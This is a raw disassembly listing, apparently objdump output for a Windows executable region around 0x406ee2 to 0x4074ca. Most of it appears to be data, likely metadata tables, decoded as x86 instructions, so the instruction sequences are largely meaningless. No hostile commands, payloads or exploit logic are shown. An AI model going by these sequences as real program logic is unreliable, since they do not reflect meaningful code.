  406ee2:	00 00                	add    %al,(%eax)
  406ee4:	00 00                	add    %al,(%eax)
  406ee6:	80 00 11             	addb   $0x11,(%eax)
  406ee9:	20 b5 15 f4 05 49    	and    %dh,0x4905f415(%ebp)
  406eef:	00 00                	add    %al,(%eax)
  406ef1:	00 00                	add    %al,(%eax)
  406ef3:	00 80 00 11 20 ce    	add    %al,-0x31dfef00(%eax)
  406ef9:	15 fb 05 4b 00       	adc    $0x4b05fb,%eax
  406efe:	00 00                	add    %al,(%eax)
  406f00:	00 00                	add    %al,(%eax)
  406f02:	80 00 11             	addb   $0x11,(%eax)
  406f05:	20 dc                	and    %bl,%ah
  406f07:	15 01 06 4d 00       	adc    $0x4d0601,%eax
  406f0c:	78 60                	js     0x406f6e
  406f0e:	00 00                	add    %al,(%eax)
  406f10:	00 00                	add    %al,(%eax)
  406f12:	11 00                	adc    %eax,(%eax)
  406f14:	f0 15 11 06 54 00    	lock adc $0x540611,%eax
  406f1a:	30 61 00             	xor    %ah,0x0(%ecx)
  406f1d:	00 00                	add    %al,(%eax)
  406f1f:	00 06                	add    %al,(%esi)
  406f21:	00 00                	add    %al,(%eax)
  406f23:	16                   	push   %ss
  406f24:	06                   	push   %es
  406f25:	00 55 00             	add    %dl,0x0(%ebp)
  406f28:	98                   	cwtl
  406f29:	62 00                	bound  %eax,(%eax)
  406f2b:	00 00                	add    %al,(%eax)
  406f2d:	00 06                	add    %al,(%esi)
  406f2f:	18 4a 00             	sbb    %cl,0x0(%edx)
  406f32:	06                   	push   %es
  406f33:	00 55 00             	add    %dl,0x0(%ebp)
  406f36:	00 00                	add    %al,(%eax)
  406f38:	00 00                	add    %al,(%eax)
  406f3a:	80 00 11             	addb   $0x11,(%eax)
  406f3d:	20 08                	and    %cl,(%eax)
  406f3f:	16                   	push   %ss
  406f40:	1e                   	push   %ds
  406f41:	06                   	push   %es
  406f42:	55                   	push   %ebp
  406f43:	00 00                	add    %al,(%eax)
  406f45:	00 00                	add    %al,(%eax)
  406f47:	00 80 00 11 20 b5    	add    %al,-0x4adfef00(%eax)
  406f4d:	15 f4 05 57 00       	adc    $0x5705f4,%eax
  406f52:	00 00                	add    %al,(%eax)
  406f54:	00 00                	add    %al,(%eax)
  406f56:	80 00 11             	addb   $0x11,(%eax)
  406f59:	20 08                	and    %cl,(%eax)
  406f5b:	12 3a                	adc    (%edx),%bh
  406f5d:	05 59 00 00 00       	add    $0x59,%eax
  406f62:	00 00                	add    %al,(%eax)
  406f64:	80 00 11             	addb   $0x11,(%eax)
  406f67:	20 2b                	and    %ch,(%ebx)
  406f69:	16                   	push   %ss
  406f6a:	24 06                	and    $0x6,%al
  406f6c:	59                   	pop    %ecx
  406f6d:	00 00                	add    %al,(%eax)
  406f6f:	00 00                	add    %al,(%eax)
  406f71:	00 80 00 11 20 f4    	add    %al,-0xbdfef00(%eax)
  406f77:	13 2c 06             	adc    (%esi,%eax,1),%ebp
  406f7a:	5c                   	pop    %esp
  406f7b:	00 00                	add    %al,(%eax)
  406f7d:	00 00                	add    %al,(%eax)
  406f7f:	00 80 00 11 20 e4    	add    %al,-0x1bdfef00(%eax)
  406f85:	12 35 06 60 00 00    	adc    0x6006,%dh
  406f8b:	00 00                	add    %al,(%eax)
  406f8d:	00 80 00 11 20 19    	add    %al,0x19201100(%eax)
  406f93:	13 83 05 63 00 00    	adc    0x6305(%ebx),%eax
  406f99:	00 00                	add    %al,(%eax)
  406f9b:	00 80 00 11 20 82    	add    %al,-0x7ddfef00(%eax)
  406fa1:	16                   	push   %ss
  406fa2:	3e 06                	ds push %es
  406fa4:	64 00 b0 62 00 00 00 	add    %dh,%fs:0x62(%eax)
  406fab:	00 01                	add    %al,(%ecx)
  406fad:	00 9e 16 47 06 67    	add    %bl,0x67064716(%esi)
  406fb3:	00 d8                	add    %bl,%al
  406fb5:	62 00                	bound  %eax,(%eax)
  406fb7:	00 00                	add    %al,(%eax)
  406fb9:	00 06                	add    %al,(%esi)
  406fbb:	00 a8 16 06 00 69    	add    %ch,0x69000616(%eax)
  406fc1:	00 34 65 00 00 00 00 	add    %dh,0x0(,%eiz,2)
  406fc8:	01 00                	add    %eax,(%eax)
  406fca:	b0 16                	mov    $0x16,%al
  406fcc:	4d                   	dec    %ebp
  406fcd:	06                   	push   %es
  406fce:	69 00 00 00 00 00    	imul   $0x0,(%eax),%eax
  406fd4:	03 00                	add    (%eax),%eax
  406fd6:	06                   	push   %es
  406fd7:	18 4a 00             	sbb    %cl,0x0(%edx)
  406fda:	1b 03                	sbb    (%ebx),%eax
  406fdc:	6a 00                	push   $0x0
  406fde:	00 00                	add    %al,(%eax)
  406fe0:	00 00                	add    %al,(%eax)
  406fe2:	03 00                	add    (%eax),%eax
  406fe4:	46                   	inc    %esi
  406fe5:	03 d7                	add    %edi,%edx
  406fe7:	16                   	push   %ss
  406fe8:	53                   	push   %ebx
  406fe9:	06                   	push   %es
  406fea:	6c                   	insb   (%dx),%es:(%edi)
  406feb:	00 00                	add    %al,(%eax)
  406fed:	00 00                	add    %al,(%eax)
  406fef:	00 03                	add    %al,(%ebx)
  406ff1:	00 46 03             	add    %al,0x3(%esi)
  406ff4:	07                   	pop    %es
  406ff5:	17                   	pop    %ss
  406ff6:	5f                   	pop    %edi
  406ff7:	06                   	push   %es
  406ff8:	70 00                	jo     0x406ffa
  406ffa:	00 00                	add    %al,(%eax)
  406ffc:	00 00                	add    %al,(%eax)
  406ffe:	03 00                	add    (%eax),%eax
  407000:	46                   	inc    %esi
  407001:	03 25 17 47 06 71    	add    0x71064717,%esp
  407007:	00 00                	add    %al,(%eax)
  407009:	00 00                	add    %al,(%eax)
  40700b:	00 03                	add    %al,(%ebx)
  40700d:	00 06                	add    %al,(%esi)
  40700f:	18 4a 00             	sbb    %cl,0x0(%edx)
  407012:	1b 03                	sbb    (%ebx),%eax
  407014:	73 00                	jae    0x407016
  407016:	00 00                	add    %al,(%eax)
  407018:	00 00                	add    %al,(%eax)
  40701a:	03 00                	add    (%eax),%eax
  40701c:	46                   	inc    %esi
  40701d:	03 d7                	add    %edi,%edx
  40701f:	16                   	push   %ss
  407020:	53                   	push   %ebx
  407021:	06                   	push   %es
  407022:	75 00                	jne    0x407024
  407024:	00 00                	add    %al,(%eax)
  407026:	00 00                	add    %al,(%eax)
  407028:	03 00                	add    (%eax),%eax
  40702a:	46                   	inc    %esi
  40702b:	03 07                	add    (%edi),%eax
  40702d:	17                   	pop    %ss
  40702e:	5f                   	pop    %edi
  40702f:	06                   	push   %es
  407030:	79 00                	jns    0x407032
  407032:	00 00                	add    %al,(%eax)
  407034:	00 00                	add    %al,(%eax)
  407036:	03 00                	add    (%eax),%eax
  407038:	46                   	inc    %esi
  407039:	03 25 17 47 06 7a    	add    0x7a064717,%esp
  40703f:	00 00                	add    %al,(%eax)
  407041:	00 01                	add    %al,(%ecx)
  407043:	00 28                	add    %ch,(%eax)
  407045:	11 00                	adc    %eax,(%eax)
  407047:	00 01                	add    %al,(%ecx)
  407049:	00 45 11             	add    %al,0x11(%ebp)
  40704c:	00 00                	add    %al,(%eax)
  40704e:	01 00                	add    %eax,(%eax)
  407050:	45                   	inc    %ebp
  407051:	11 00                	adc    %eax,(%eax)
  407053:	00 01                	add    %al,(%ecx)
  407055:	00 f5                	add    %dh,%ch
  407057:	11 00                	adc    %eax,(%eax)
  407059:	00 01                	add    %al,(%ecx)
  40705b:	00 f5                	add    %dh,%ch
  40705d:	11 00                	adc    %eax,(%eax)
  40705f:	00 02                	add    %al,(%edx)
  407061:	00 f8                	add    %bh,%al
  407063:	11 00                	adc    %eax,(%eax)
  407065:	00 01                	add    %al,(%ecx)
  407067:	00 02                	add    %al,(%edx)
  407069:	12 00                	adc    (%eax),%al
  40706b:	20 01                	and    %al,(%ecx)
  40706d:	00 47 12             	add    %al,0x12(%edi)
  407070:	00 20                	add    %ah,(%eax)
  407072:	02 00                	add    (%eax),%al
  407074:	56                   	push   %esi
  407075:	12 00                	adc    (%eax),%al
  407077:	00 03                	add    %al,(%ebx)
  407079:	00 69 12             	add    %ch,0x12(%ecx)
  40707c:	00 00                	add    %al,(%eax)
  40707e:	04 00                	add    $0x0,%al
  407080:	79 12                	jns    0x407094
  407082:	00 00                	add    %al,(%eax)
  407084:	05 00 8e 12 00       	add    $0x128e00,%eax
  407089:	00 06                	add    %al,(%esi)
  40708b:	00 a7 12 00 20 07    	add    %ah,0x7200012(%edi)
  407091:	00 b9 12 00 00 08    	add    %bh,0x8000012(%ecx)
  407097:	00 d0                	add    %dl,%al
  407099:	12 00                	adc    (%eax),%al
  40709b:	00 01                	add    %al,(%ecx)
  40709d:	00 01                	add    %al,(%ecx)
  40709f:	13 00                	adc    (%eax),%eax
  4070a1:	20 02                	and    %al,(%edx)
  4070a3:	00 06                	add    %al,(%esi)
  4070a5:	13 00                	adc    (%eax),%eax
  4070a7:	00 03                	add    %al,(%ebx)
  4070a9:	00 0f                	add    %cl,(%edi)
  4070ab:	13 00                	adc    (%eax),%eax
  4070ad:	00 01                	add    %al,(%ecx)
  4070af:	00 42 13             	add    %al,0x13(%edx)
  4070b2:	00 00                	add    %al,(%eax)
  4070b4:	01 00                	add    %eax,(%eax)
  4070b6:	60                   	pusha
  4070b7:	13 00                	adc    (%eax),%eax
  4070b9:	20 02                	and    %al,(%edx)
  4070bb:	00 68 13             	add    %ch,0x13(%eax)
  4070be:	00 00                	add    %al,(%eax)
  4070c0:	03 00                	add    (%eax),%eax
  4070c2:	71 13                	jno    0x4070d7
  4070c4:	00 20                	add    %ah,(%eax)
  4070c6:	04 00                	add    $0x0,%al
  4070c8:	78 13                	js     0x4070dd
  4070ca:	00 00                	add    %al,(%eax)
  4070cc:	05 00 80 13 00       	add    $0x138000,%eax
  4070d1:	00 01                	add    %al,(%ecx)
  4070d3:	00 8e 13 00 00 02    	add    %cl,0x2000013(%esi)
  4070d9:	00 91 13 00 00 01    	add    %dl,0x1000013(%ecx)
  4070df:	00 a0 13 00 00 01    	add    %ah,0x1000013(%eax)
  4070e5:	00 a6 13 00 00 01    	add    %ah,0x1000013(%esi)
  4070eb:	00 a0 13 00 00 01    	add    %ah,0x1000013(%eax)
  4070f1:	00 a6 13 00 00 02    	add    %ah,0x2000013(%esi)
  4070f7:	00 b3 13 00 00 01    	add    %dh,0x1000013(%ebx)
  4070fd:	00 91 11 00 00 01    	add    %dl,0x1000011(%ecx)
  407103:	00 d7                	add    %dl,%bh
  407105:	13 00                	adc    (%eax),%eax
  407107:	00 01                	add    %al,(%ecx)
  407109:	00 ee                	add    %ch,%dh
  40710b:	13 00                	adc    (%eax),%eax
  40710d:	00 01                	add    %al,(%ecx)
  40710f:	00 01                	add    %al,(%ecx)
  407111:	13 00                	adc    (%eax),%eax
  407113:	00 02                	add    %al,(%edx)
  407115:	00 00                	add    %al,(%eax)
  407117:	14 00                	adc    $0x0,%al
  407119:	00 03                	add    %al,(%ebx)
  40711b:	00 04 14             	add    %al,(%esp,%edx,1)
  40711e:	00 00                	add    %al,(%eax)
  407120:	04 00                	add    $0x0,%al
  407122:	0b 14 00             	or     (%eax,%eax,1),%edx
  407125:	00 01                	add    %al,(%ecx)
  407127:	00 42 13             	add    %al,0x13(%edx)
  40712a:	00 00                	add    %al,(%eax)
  40712c:	02 00                	add    (%eax),%al
  40712e:	1f                   	pop    %ds
  40712f:	14 00                	adc    $0x0,%al
  407131:	00 03                	add    %al,(%ebx)
  407133:	00 2f                	add    %ch,(%edi)
  407135:	14 00                	adc    $0x0,%al
  407137:	00 04 00             	add    %al,(%eax,%eax,1)
  40713a:	31 14 00             	xor    %edx,(%eax,%eax,1)
  40713d:	00 05 00 33 14 00    	add    %al,0x143300
  407143:	00 06                	add    %al,(%esi)
  407145:	00 36                	add    %dh,(%esi)
  407147:	14 00                	adc    $0x0,%al
  407149:	00 07                	add    %al,(%edi)
  40714b:	00 39                	add    %bh,(%ecx)
  40714d:	14 00                	adc    $0x0,%al
  40714f:	20 01                	and    %al,(%ecx)
  407151:	00 5d 14             	add    %bl,0x14(%ebp)
  407154:	00 20                	add    %ah,(%eax)
  407156:	02 00                	add    (%eax),%al
  407158:	6d                   	insl   (%dx),%es:(%edi)
  407159:	14 00                	adc    $0x0,%al
  40715b:	00 03                	add    %al,(%ebx)
  40715d:	00 7c 14 00          	add    %bh,0x0(%esp,%edx,1)
  407161:	00 04 00             	add    %al,(%eax,%eax,1)
  407164:	8a 14 00             	mov    (%eax,%eax,1),%dl
  407167:	00 01                	add    %al,(%ecx)
  407169:	00 9c 14 00 00 02 00 	add    %bl,0x20000(%esp,%edx,1)
  407170:	a1 14 00 00 01       	mov    0x1000014,%eax
  407175:	00 ad 14 00 00 01    	add    %ch,0x1000014(%ebp)
  40717b:	00 7b 11             	add    %bh,0x11(%ebx)
  40717e:	00 00                	add    %al,(%eax)
  407180:	01 00                	add    %eax,(%eax)
  407182:	02 12                	add    (%edx),%dl
  407184:	00 00                	add    %al,(%eax)
  407186:	01 00                	add    %eax,(%eax)
  407188:	dd 14 00             	fstl   (%eax,%eax,1)
  40718b:	00 02                	add    %al,(%edx)
  40718d:	00 e6                	add    %ah,%dh
  40718f:	14 00                	adc    $0x0,%al
  407191:	00 03                	add    %al,(%ebx)
  407193:	00 fe                	add    %bh,%dh
  407195:	14 00                	adc    $0x0,%al
  407197:	00 04 00             	add    %al,(%eax,%eax,1)
  40719a:	11 15 00 00 01 00    	adc    %edx,0x10000
  4071a0:	7b 11                	jnp    0x4071b3
  4071a2:	00 00                	add    %al,(%eax)
  4071a4:	02 00                	add    (%eax),%al
  4071a6:	31 15 00 00 01 00    	xor    %edx,0x10000
  4071ac:	36 15 00 00 01 00    	ss adc $0x10000,%eax
  4071b2:	3e 15 00 00 01 00    	ds adc $0x10000,%eax
  4071b8:	3e 15 00 00 01 00    	ds adc $0x10000,%eax
  4071be:	7b 11                	jnp    0x4071d1
  4071c0:	00 00                	add    %al,(%eax)
  4071c2:	01 00                	add    %eax,(%eax)
  4071c4:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4071c5:	13 00                	adc    (%eax),%eax
  4071c7:	00 02                	add    %al,(%edx)
  4071c9:	00 4a 15             	add    %cl,0x15(%edx)
  4071cc:	00 00                	add    %al,(%eax)
  4071ce:	03 00                	add    (%eax),%eax
  4071d0:	4c                   	dec    %esp
  4071d1:	15 00 00 01 00       	adc    $0x10000,%eax
  4071d6:	02 12                	add    (%edx),%dl
  4071d8:	00 00                	add    %al,(%eax)
  4071da:	01 00                	add    %eax,(%eax)
  4071dc:	7d 15                	jge    0x4071f3
  4071de:	00 00                	add    %al,(%eax)
  4071e0:	01 00                	add    %eax,(%eax)
  4071e2:	90                   	nop
  4071e3:	15 00 00 01 00       	adc    $0x10000,%eax
  4071e8:	90                   	nop
  4071e9:	15 00 00 01 00       	adc    $0x10000,%eax
  4071ee:	90                   	nop
  4071ef:	15 00 00 01 00       	adc    $0x10000,%eax
  4071f4:	90                   	nop
  4071f5:	15 00 00 02 00       	adc    $0x20000,%eax
  4071fa:	7b 11                	jnp    0x40720d
  4071fc:	00 00                	add    %al,(%eax)
  4071fe:	01 00                	add    %eax,(%eax)
  407200:	90                   	nop
  407201:	15 00 00 02 00       	adc    $0x20000,%eax
  407206:	7b 11                	jnp    0x407219
  407208:	00 00                	add    %al,(%eax)
  40720a:	01 00                	add    %eax,(%eax)
  40720c:	90                   	nop
  40720d:	15 00 00 02 00       	adc    $0x20000,%eax
  407212:	7b 11                	jnp    0x407225
  407214:	00 00                	add    %al,(%eax)
  407216:	03 00                	add    (%eax),%eax
  407218:	31 15 02 20 04 00    	xor    %edx,0x42002
  40721e:	e8 15 00 00 05       	call   0x5407238
  407223:	00 ea                	add    %ch,%dl
  407225:	15 00 00 06 00       	adc    $0x60000,%eax
  40722a:	ec                   	in     (%dx),%al
  40722b:	15 00 00 07 00       	adc    $0x70000,%eax
  407230:	ee                   	out    %al,(%dx)
  407231:	15 00 00 01 00       	adc    $0x10000,%eax
  407236:	90                   	nop
  407237:	15 00 00 01 00       	adc    $0x10000,%eax
  40723c:	01 13                	add    %edx,(%ebx)
  40723e:	00 00                	add    %al,(%eax)
  407240:	02 00                	add    (%eax),%al
  407242:	15 16 00 00 01       	adc    $0x1000016,%eax
  407247:	00 42 13             	add    %al,0x13(%edx)
  40724a:	00 00                	add    %al,(%eax)
  40724c:	02 00                	add    (%eax),%al
  40724e:	1d 16 00 00 01       	sbb    $0x1000016,%eax
  407253:	00 42 13             	add    %al,0x13(%edx)
  407256:	00 20                	add    %ah,(%eax)
  407258:	02 00                	add    (%eax),%al
  40725a:	46                   	inc    %esi
  40725b:	16                   	push   %ss
  40725c:	00 00                	add    %al,(%eax)
  40725e:	03 00                	add    (%eax),%eax
  407260:	52                   	push   %edx
  407261:	16                   	push   %ss
  407262:	00 00                	add    %al,(%eax)
  407264:	01 00                	add    %eax,(%eax)
  407266:	42                   	inc    %edx
  407267:	13 00                	adc    (%eax),%eax
  407269:	00 02                	add    %al,(%edx)
  40726b:	00 69 16             	add    %ch,0x16(%ecx)
  40726e:	00 00                	add    %al,(%eax)
  407270:	03 00                	add    (%eax),%eax
  407272:	04 14                	add    $0x14,%al
  407274:	00 20                	add    %ah,(%eax)
  407276:	04 00                	add    $0x0,%al
  407278:	6e                   	outsb  %ds:(%esi),(%dx)
  407279:	16                   	push   %ss
  40727a:	00 00                	add    %al,(%eax)
  40727c:	01 00                	add    %eax,(%eax)
  40727e:	42                   	inc    %edx
  40727f:	13 00                	adc    (%eax),%eax
  407281:	00 02                	add    %al,(%edx)
  407283:	00 75 16             	add    %dh,0x16(%ebp)
  407286:	00 00                	add    %al,(%eax)
  407288:	03 00                	add    (%eax),%eax
  40728a:	7e 16                	jle    0x4072a2
  40728c:	00 00                	add    %al,(%eax)
  40728e:	01 00                	add    %eax,(%eax)
  407290:	42                   	inc    %edx
  407291:	13 00                	adc    (%eax),%eax
  407293:	00 01                	add    %al,(%ecx)
  407295:	00 01                	add    %al,(%ecx)
  407297:	13 00                	adc    (%eax),%eax
  407299:	00 02                	add    %al,(%edx)
  40729b:	00 93 16 00 00 03    	add    %dl,0x3000016(%ebx)
  4072a1:	00 6e 16             	add    %ch,0x16(%esi)
  4072a4:	00 00                	add    %al,(%eax)
  4072a6:	01 00                	add    %eax,(%eax)
  4072a8:	01 13                	add    %edx,(%ebx)
  4072aa:	00 00                	add    %al,(%eax)
  4072ac:	02 00                	add    (%eax),%al
  4072ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4072af:	16                   	push   %ss
  4072b0:	00 00                	add    %al,(%eax)
  4072b2:	01 00                	add    %eax,(%eax)
  4072b4:	b9 16 00 00 01       	mov    $0x1000016,%ecx
  4072b9:	00 bd 16 00 00 02    	add    %bh,0x2000016(%ebp)
  4072bf:	00 ca                	add    %cl,%dl
  4072c1:	16                   	push   %ss
  4072c2:	00 00                	add    %al,(%eax)
  4072c4:	01 00                	add    %eax,(%eax)
  4072c6:	01 13                	add    %edx,(%ebx)
  4072c8:	00 00                	add    %al,(%eax)
  4072ca:	02 00                	add    (%eax),%al
  4072cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4072cd:	16                   	push   %ss
  4072ce:	00 00                	add    %al,(%eax)
  4072d0:	03 00                	add    (%eax),%eax
  4072d2:	e3 16                	jecxz  0x4072ea
  4072d4:	00 00                	add    %al,(%eax)
  4072d6:	04 00                	add    $0x0,%al
  4072d8:	f4                   	hlt
  4072d9:	16                   	push   %ss
  4072da:	00 00                	add    %al,(%eax)
  4072dc:	01 00                	add    %eax,(%eax)
  4072de:	11 17                	adc    %edx,(%edi)
  4072e0:	00 00                	add    %al,(%eax)
  4072e2:	01 00                	add    %eax,(%eax)
  4072e4:	01 13                	add    %edx,(%ebx)
  4072e6:	00 00                	add    %al,(%eax)
  4072e8:	02 00                	add    (%eax),%al
  4072ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4072eb:	16                   	push   %ss
  4072ec:	00 00                	add    %al,(%eax)
  4072ee:	01 00                	add    %eax,(%eax)
  4072f0:	bd 16 00 00 02       	mov    $0x2000016,%ebp
  4072f5:	00 ca                	add    %cl,%dl
  4072f7:	16                   	push   %ss
  4072f8:	00 00                	add    %al,(%eax)
  4072fa:	01 00                	add    %eax,(%eax)
  4072fc:	01 13                	add    %edx,(%ebx)
  4072fe:	00 00                	add    %al,(%eax)
  407300:	02 00                	add    (%eax),%al
  407302:	6e                   	outsb  %ds:(%esi),(%dx)
  407303:	16                   	push   %ss
  407304:	00 00                	add    %al,(%eax)
  407306:	03 00                	add    (%eax),%eax
  407308:	e3 16                	jecxz  0x407320
  40730a:	00 00                	add    %al,(%eax)
  40730c:	04 00                	add    $0x0,%al
  40730e:	f4                   	hlt
  40730f:	16                   	push   %ss
  407310:	00 00                	add    %al,(%eax)
  407312:	01 00                	add    %eax,(%eax)
  407314:	11 17                	adc    %edx,(%edi)
  407316:	00 00                	add    %al,(%eax)
  407318:	01 00                	add    %eax,(%eax)
  40731a:	01 13                	add    %edx,(%ebx)
  40731c:	00 00                	add    %al,(%eax)
  40731e:	02 00                	add    (%eax),%al
  407320:	6e                   	outsb  %ds:(%esi),(%dx)
  407321:	16                   	push   %ss
  407322:	09 00                	or     %eax,(%eax)
  407324:	4a                   	dec    %edx
  407325:	00 01                	add    %al,(%ecx)
  407327:	00 11                	add    %dl,(%ecx)
  407329:	00 4a 00             	add    %cl,0x0(%edx)
  40732c:	06                   	push   %es
  40732d:	00 21                	add    %ah,(%ecx)
  40732f:	00 4a 00             	add    %cl,0x0(%edx)
  407332:	0a 00                	or     (%eax),%al
  407334:	31 00                	xor    %eax,(%eax)
  407336:	4a                   	dec    %edx
  407337:	00 10                	add    %dl,(%eax)
  407339:	00 39                	add    %bh,(%ecx)
  40733b:	00 4a 00             	add    %cl,0x0(%edx)
  40733e:	06                   	push   %es
  40733f:	00 19                	add    %bl,(%ecx)
  407341:	00 4a 00             	add    %cl,0x0(%edx)
  407344:	06                   	push   %es
  407345:	00 49 00             	add    %cl,0x0(%ecx)
  407348:	4a                   	dec    %edx
  407349:	00 06                	add    %al,(%esi)
  40734b:	00 41 00             	add    %al,0x0(%ecx)
  40734e:	4a                   	dec    %edx
  40734f:	00 06                	add    %al,(%esi)
  407351:	00 59 00             	add    %bl,0x0(%ecx)
  407354:	4a                   	dec    %edx
  407355:	00 06                	add    %al,(%esi)
  407357:	00 61 00             	add    %ah,0x0(%ecx)
  40735a:	4a                   	dec    %edx
  40735b:	00 06                	add    %al,(%esi)
  40735d:	00 69 00             	add    %ch,0x0(%ecx)
  407360:	4a                   	dec    %edx
  407361:	00 16                	add    %dl,(%esi)
  407363:	00 71 00             	add    %dh,0x0(%ecx)
  407366:	2f                   	das
  407367:	02 1e                	add    (%esi),%bl
  407369:	00 51 00             	add    %dl,0x0(%ecx)
  40736c:	3e 02 23             	add    %ds:(%ebx),%ah
  40736f:	00 51 00             	add    %dl,0x0(%ecx)
  407372:	45                   	inc    %ebp
  407373:	02 28                	add    (%eax),%ch
  407375:	00 79 00             	add    %bh,0x0(%ecx)
  407378:	68 02 2c 00 51       	push   $0x51002c02
  40737d:	00 7a 02             	add    %bh,0x2(%edx)
  407380:	33 00                	xor    (%eax),%eax
  407382:	89 00                	mov    %eax,(%eax)
  407384:	8d 02                	lea    (%edx),%eax
  407386:	3a 00                	cmp    (%eax),%al
  407388:	51                   	push   %ecx
  407389:	00 4a 00             	add    %cl,0x0(%edx)
  40738c:	06                   	push   %es
  40738d:	00 91 00 4a 00 45    	add    %dl,0x45004a00(%ecx)
  407393:	00 99 00 4a 00 06    	add    %bl,0x6004a00(%ecx)
  407399:	00 a1 00 4a 00 06    	add    %ah,0x6004a00(%ecx)
  40739f:	00 14 00             	add    %dl,(%eax,%eax,1)
  4073a2:	00 03                	add    %al,(%ebx)
  4073a4:	51                   	push   %ecx
  4073a5:	00 24 00             	add    %ah,(%eax,%eax,1)
  4073a8:	4a                   	dec    %edx
  4073a9:	00 06                	add    %al,(%esi)
  4073ab:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4073ae:	4a                   	dec    %edx
  4073af:	00 06                	add    %al,(%esi)
  4073b1:	00 34 00             	add    %dh,(%eax,%eax,1)
  4073b4:	4a                   	dec    %edx
  4073b5:	00 06                	add    %al,(%esi)
  4073b7:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4073ba:	4a                   	dec    %edx
  4073bb:	00 06                	add    %al,(%esi)
  4073bd:	00 24 00             	add    %ah,(%eax,%eax,1)
  4073c0:	19 03                	sbb    %eax,(%ebx)
  4073c2:	79 00                	jns    0x4073c4
  4073c4:	2c 00                	sub    $0x0,%al
  4073c6:	19 03                	sbb    %eax,(%ebx)
  4073c8:	79 00                	jns    0x4073ca
  4073ca:	34 00                	xor    $0x0,%al
  4073cc:	19 03                	sbb    %eax,(%ebx)
  4073ce:	79 00                	jns    0x4073d0
  4073d0:	3c 00                	cmp    $0x0,%al
  4073d2:	19 03                	sbb    %eax,(%ebx)
  4073d4:	79 00                	jns    0x4073d6
  4073d6:	b1 00                	mov    $0x0,%cl
  4073d8:	4a                   	dec    %edx
  4073d9:	00 7e 00             	add    %bh,0x0(%esi)
  4073dc:	b9 00 4a 00 06       	mov    $0x6004a00,%ecx
  4073e1:	00 e9                	add    %ch,%cl
  4073e3:	00 c7                	add    %al,%bh
  4073e5:	03 83 00 e9 00 7a    	add    0x7a00e900(%ebx),%eax
  4073eb:	02 88 00 f1 00 ec    	add    -0x13ff0f00(%eax),%cl
  4073f1:	03 8d 00 f1 00 fd    	add    -0x2ff0f00(%ebp),%ecx
  4073f7:	03 33                	add    (%ebx),%esi
  4073f9:	00 d1                	add    %dl,%cl
  4073fb:	00 4a 00             	add    %cl,0x0(%edx)
  4073fe:	7e 00                	jle    0x407400
  407400:	d9 00                	flds   (%eax)
  407402:	4a                   	dec    %edx
  407403:	00 06                	add    %al,(%esi)
  407405:	00 09                	add    %cl,(%ecx)
  407407:	01 42 04             	add    %eax,0x4(%edx)
  40740a:	95                   	xchg   %eax,%ebp
  40740b:	00 09                	add    %cl,(%ecx)
  40740d:	01 47 04             	add    %eax,0x4(%edi)
  407410:	98                   	cwtl
  407411:	00 09                	add    %cl,(%ecx)
  407413:	01 53 04             	add    %edx,0x4(%ebx)
  407416:	9e                   	sahf
  407417:	00 11                	add    %dl,(%ecx)
  407419:	01 67 04             	add    %esp,0x4(%edi)
  40741c:	a3 00 19 01 74       	mov    %eax,0x74011900
  407421:	04 28                	add    $0x28,%al
  407423:	00 21                	add    %ah,(%ecx)
  407425:	01 8b 04 a8 00 21    	add    %ecx,0x2100a804(%ebx)
  40742b:	01 9b 04 af 00 29    	add    %ebx,0x2900af04(%ebx)
  407431:	01 c2                	add    %eax,%edx
  407433:	04 b3                	add    $0xb3,%al
  407435:	00 29                	add    %ch,(%ecx)
  407437:	01 cb                	add    %ecx,%ebx
  407439:	04 b9                	add    $0xb9,%al
  40743b:	00 d1                	add    %dl,%cl
  40743d:	00 e3                	add    %ah,%bl
  40743f:	04 33                	add    $0x33,%al
  407441:	00 19                	add    %bl,(%ecx)
  407443:	01 ec                	add    %ebp,%esp
  407445:	04 33                	add    $0x33,%al
  407447:	00 39                	add    %bh,(%ecx)
  407449:	01 fe                	add    %edi,%esi
  40744b:	04 bf                	add    $0xbf,%al
  40744d:	00 d1                	add    %dl,%cl
  40744f:	00 0c 05 c6 00 31 01 	add    %cl,0x13100c6(,%eax,1)
  407456:	e3 04                	jecxz  0x40745c
  407458:	33 00                	xor    (%eax),%eax
  40745a:	31 01                	xor    %eax,(%ecx)
  40745c:	1a 05 c6 00 41 01    	sbb    0x14100c6,%al
  407462:	3d 05 cc 00 49       	cmp    $0x4900cc05,%eax
  407467:	01 4b 05             	add    %ecx,0x5(%ebx)
  40746a:	d1 00                	roll   $1,(%eax)
  40746c:	c1 00 51             	roll   $0x51,(%eax)
  40746f:	05 06 00 51 01       	add    $0x1510006,%eax
  407474:	5e                   	pop    %esi
  407475:	05 06 00 c1 00       	add    $0xc10006,%eax
  40747a:	4a                   	dec    %edx
  40747b:	00 06                	add    %al,(%esi)
  40747d:	00 c1                	add    %al,%cl
  40747f:	00 66 05             	add    %ah,0x5(%esi)
  407482:	01 00                	add    %eax,(%eax)
  407484:	c1 00 7c             	roll   $0x7c,(%eax)
  407487:	05 01 00 c1 00       	add    $0xc10001,%eax
  40748c:	96                   	xchg   %eax,%esi
  40748d:	05 d6 00 59 01       	add    $0x15900d6,%eax
  407492:	a1 05 01 00 59       	mov    0x59000105,%eax
  407497:	01 b1 05 01 00 e9    	add    %esi,-0x16fffefb(%ecx)
  40749d:	00 c4                	add    %al,%ah
  40749f:	05 dc 00 69 01       	add    $0x16900dc,%eax
  4074a4:	e3 05                	jecxz  0x4074ab
  4074a6:	e1 00                	loope  0x4074a8
  4074a8:	39 01                	cmp    %eax,(%ecx)
  4074aa:	ec                   	in     (%dx),%al
  4074ab:	05 f3 00 19 01       	add    $0x11900f3,%eax
  4074b0:	0a 06                	or     (%esi),%al
  4074b2:	fa                   	cli
  4074b3:	00 19                	add    %bl,(%ecx)
  4074b5:	01 0a                	add    %ecx,(%edx)
  4074b7:	06                   	push   %es
  4074b8:	01 01                	add    %eax,(%ecx)
  4074ba:	e9 00 7a 02 07       	jmp    0x742eebf
  4074bf:	01 49 01             	add    %ecx,0x1(%ecx)
  4074c2:	11 06                	adc    %eax,(%esi)
  4074c4:	d1 00                	roll   $1,(%eax)
  4074c6:	71 01                	jno    0x4074c9
  4074c8:	1e                   	push   %ds
  4074c9:	06                   	push   %es
  4074ca:	0c 01                	or     $0x1,%al
